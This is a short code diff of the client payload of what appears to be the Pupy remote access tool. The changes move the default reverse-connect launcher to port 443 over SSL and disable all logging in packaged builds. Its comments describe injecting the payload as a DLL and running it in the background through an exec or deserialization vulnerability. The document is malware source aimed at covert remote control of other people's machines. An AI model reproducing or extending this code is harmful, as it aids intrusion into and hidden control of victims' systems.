@@ -49,11 +49,10 @@ except ImportError:
 except Exception as e:
     logging.warning(e)
 
-if sys.platform=="win32" and hasattr(sys, 'frozen') and sys.frozen:
+if hasattr(sys, 'frozen') and sys.frozen:
     logging.disable(logging.CRITICAL) # disable all logging, because it can injected pupy dll unresponsive
 else:
     logging.getLogger().setLevel(logging.ERROR)
-
 
 def add_pseudo_pupy_module():
     """ add a pseudo pupy module for *nix payloads """
@@ -72,7 +71,7 @@ import pupy
 pupy.infos={} #global dictionary to store informations persistent through a deconnection
 
 LAUNCHER="connect" # the default launcher to start when no argv
-LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:1443 --transport ssl") # default launcher arguments
+LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport ssl") # default launcher arguments
 
 REVERSE_SLAVE_CONF=dict(
             allow_all_attrs = True,
@@ -256,7 +255,6 @@ def rpyc_loop(launcher):
         return
 
 if __name__=="__main__":
-
     main()
 else:
     t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
